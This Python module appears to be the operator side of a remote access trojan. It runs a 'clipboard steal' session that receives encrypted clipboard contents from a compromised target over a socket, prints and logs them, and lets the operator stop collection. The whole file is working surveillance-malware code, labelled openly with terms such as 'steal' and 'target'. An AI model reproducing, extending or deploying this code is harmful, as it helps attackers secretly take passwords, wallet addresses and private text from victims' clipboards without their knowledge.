"""Utilities for reliable clipboard capture from a client."""

from __future__ import annotations

import socket
import threading
import time
from typing import List

from termcolor import colored

from components.networking import (
    decrypt_message,
    encrypt_message,
    clear_socket_buffer,
)
from components.logging import log_activity


class ClipGrabber:
    """Continuously receive clipboard data while allowing operator interaction."""

    def __init__(self, conn_obj: socket.socket, key: bytes) -> None:
        self.conn_obj = conn_obj
        self.key = key
        self.stop_event = threading.Event()
        self.received: List[str] = []
        self.lock = threading.Lock()
        self._original_timeout = conn_obj.gettimeout()

    # ------------------------------------------------------------------
    def _listen_clipboard(self) -> None:
        """Background thread for receiving clipboard entries from the client."""

        self.conn_obj.settimeout(0.5)
        while not self.stop_event.is_set():
            try:
                data = decrypt_message(self.conn_obj.recv(4096), self.key)
                if not data:
                    continue
                decoded = data.decode().strip()
                if not decoded:
                    continue
                with self.lock:
                    self.received.extend(decoded.split("\n"))
                print(colored(f"[CLIP] {decoded}", "green"))
            except socket.timeout:
                continue
            except Exception as e:  # pragma: no cover - network errors
                print(f"[-] Error receiving clipboard data: {e}")
                break

    # ------------------------------------------------------------------
    def _user_input(self) -> None:
        """Allow the operator to stop clipboard collection."""

        while not self.stop_event.is_set():
            try:
                cmd = input("clipgrabber > ").strip().lower()
                if cmd in {"exit", "quit"}:
                    self.conn_obj.sendall(encrypt_message("END", self.key))
                    self.stop_event.set()
                elif cmd:
                    print("Unknown command. Type 'exit' to stop.")
            except KeyboardInterrupt:
                self.conn_obj.sendall(encrypt_message("END", self.key))
                self.stop_event.set()

    # ------------------------------------------------------------------
    def run(self) -> str:
        """Start listening threads and return aggregated clipboard data."""

        print(
            f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
        )

        listener = threading.Thread(target=self._listen_clipboard, daemon=True)
        input_thread = threading.Thread(target=self._user_input)

        listener.start()
        input_thread.start()

        input_thread.join()
        self.stop_event.set()
        listener.join()

        print(
            f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
        )

        # Restore state and cleanup
        self.conn_obj.settimeout(self._original_timeout)
        clear_socket_buffer(self.conn_obj)

        if not self.received:
            log_activity("No clipboard entries have been gathered.", "info")
            return "[-] No clipboard data gathered from target"

        result = []
        for idx, entry in enumerate(self.received, 1):
            entry = entry.strip()
            if entry:
                result.append(colored(f"[+] Clipboard Entry {idx} -> {entry}", "green"))

        log_activity(f"Gathered {len(result)} clipboard entries.", "info")
        return "\n".join(result)


def clipboard_steal_command(
    client_output: bytes, conn_obj: socket.socket, key: bytes
) -> str:
    """Entry point used by the framework to start the clipboard grabber."""

    message = decrypt_message(client_output, key)
    if not message:
        return colored(
            "[-] An error has occurred when starting the clipboard steal function. Please try again in a few moments.",
            "red",
        )

    decoded = message.decode()
    if decoded == "NOCLIP":
        return colored("[-] Target has no clipboard capabilities.", "red")
    if decoded != "STARTED":
        return colored(
            "[-] An error has occurred when starting the clipboard steal function. Please try again in a few moments.",
            "red",
        )

    grabber = ClipGrabber(conn_obj, key)
    return grabber.run()

